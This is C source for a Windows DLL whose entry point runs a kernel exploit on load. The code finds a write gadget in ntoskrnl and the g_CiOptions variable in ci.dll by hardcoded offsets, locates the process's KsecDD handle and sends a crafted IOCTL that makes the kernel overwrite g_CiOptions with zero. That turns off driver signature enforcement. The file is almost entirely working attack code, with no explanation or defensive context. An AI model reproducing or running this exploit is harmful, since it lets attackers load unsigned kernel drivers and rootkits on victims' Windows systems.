#include <Windows.h>
#include <winternl.h>
#include <psapi.h>

#pragma comment (lib, "ntdll")

// mov qword [rcx], rdx
#define NTOSKRNL_WRITE_GADGET 0x53A4B0

// ci!g_CiOptions
#define CI_OPTIONS 0x4D004

#define IOCTL_KSEC_IPC_SET_FUNCTION_RETURN 0x39006f

typedef struct _SYSTEM_HANDLE {
    ULONG ProcessId;
    BYTE ObjectTypeNumber;
    BYTE Flags;
    USHORT Handle;
    PVOID Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG HandleCount;
    SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef struct _OBJECT_BASIC_INFORMATION {
    ULONG Attributes;
    ACCESS_MASK GrantedAccess;
    ULONG HandleCount;
    ULONG PointerCount;
    ULONG PagedPoolUsage;
    ULONG NonPagedPoolUsage;
    ULONG Reserved[3];
    ULONG NameInformationLength;
    ULONG TypeInformationLength;
    ULONG SecurityDescriptorLength;
    LARGE_INTEGER CreateTime;
} OBJECT_BASIC_INFORMATION, *POBJECT_BASIC_INFORMATION;

typedef struct _OBJECT_NAME_INFORMATION {
    UNICODE_STRING Name;
} OBJECT_NAME_INFORMATION, *POBJECT_NAME_INFORMATION;

BOOL FindKernelAddresses(UINT64 *WriteGadget, UINT64 *CiOptions) {
    LPVOID DriverBases[1024];
    CHAR DriverName[100];
    DWORD Needed;
    ULONG i, DriverCount;

    if (!WriteGadget || !CiOptions) {
        return FALSE;
    }
    *WriteGadget = 0;
    *CiOptions = 0;

    if (!EnumDeviceDrivers(DriverBases, sizeof(DriverBases), &Needed) || (Needed >= sizeof(DriverBases))) {
        return FALSE;
    }

    DriverCount = Needed / sizeof(DriverBases[0]);

    for (i = 0; i < DriverCount; i++) {
        if (!GetDeviceDriverBaseNameA(DriverBases[i], DriverName, sizeof(DriverName))) {
            continue;
        }

        if (!_stricmp(DriverName, "ntoskrnl.exe")) {
            *WriteGadget = (UINT64)DriverBases[i] + NTOSKRNL_WRITE_GADGET;
            continue;
        }

        if (!_stricmp(DriverName, "ci.dll")) {
            *CiOptions = (UINT64)DriverBases[i] + CI_OPTIONS;
            continue;
        }
    }

    return (*WriteGadget && *CiOptions);
}

VOID Exploit() {
    NTSTATUS Status;
    ULONG *Buffer = NULL, BufferSize = 0x1000 * sizeof(ULONG), i;
    struct {
        UINT64 Rip;
        UINT64 Arg1;
    } IoctlStructure;

    if (!FindKernelAddresses(&IoctlStructure.Rip, &IoctlStructure.Arg1)) {
        goto end;
    }

    Buffer = (ULONG *)malloc(BufferSize);
    if (!Buffer) {
        goto end;
    }
 
    // 0xC0000004 == STATUS_INFO_LENGTH_MISMATCH
    while ((Status = NtQuerySystemInformation(0x10, Buffer, BufferSize, 0)) == 0xC0000004) {
        free(Buffer);
        BufferSize *= 2;

        Buffer = malloc(BufferSize);
        if (!Buffer) {
            goto end;
        }
    }

    if (Status != 0) {
        goto end;
    }

    // find the ksecdd handle
    SYSTEM_HANDLE_INFORMATION *Info = (SYSTEM_HANDLE_INFORMATION *)Buffer;
    for (i = 0; i < Info->HandleCount; i++) {
        HANDLE CurrentHandle = (HANDLE)Info->Handles[i].Handle;
        OBJECT_BASIC_INFORMATION BasicInformation;
        OBJECT_NAME_INFORMATION *NameInformation;
        UINT8 IoctlBuffer[16];

        if (Info->Handles[i].ProcessId != GetCurrentProcessId()) {
            continue;
        }

        if (NtQueryObject(CurrentHandle, 0, &BasicInformation, sizeof(BasicInformation), &BufferSize) != 0) {
            continue;
        }

        BufferSize = BasicInformation.NameInformationLength == 0 ?
                        MAX_PATH * sizeof(WCHAR) : BasicInformation.NameInformationLength;

        NameInformation = (OBJECT_NAME_INFORMATION *)malloc(BufferSize);
        if (!NameInformation) {
            goto end;
        }

        if (NtQueryObject(CurrentHandle, 1, NameInformation, BufferSize, &BufferSize) != 0) {
            free(NameInformation);
            continue;
        }

        if (!NameInformation->Name.Buffer) {
            free(NameInformation);
            continue;
        }

        if (!wcsstr(NameInformation->Name.Buffer, L"KsecDD")) {
            free(NameInformation);
            continue;
        }

        free(NameInformation);
 
        *(UINT64 *)IoctlBuffer = (UINT64)&IoctlStructure;

        // this controls edx (we want to write 0 to g_CiOptions)
        *(UINT64 *)&IoctlBuffer[8] = 0;

        DeviceIoControl(CurrentHandle, IOCTL_KSEC_IPC_SET_FUNCTION_RETURN, IoctlBuffer, 16, NULL, 0, NULL, NULL);
        break;
    }

end:
    if (Buffer) {
        free(Buffer);
    }
}

BOOL APIENTRY DllMain(HMODULE Module, DWORD ReasonForCall, LPVOID Reserved) {
    switch(ReasonForCall) {
    case DLL_PROCESS_ATTACH:
        Exploit();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}

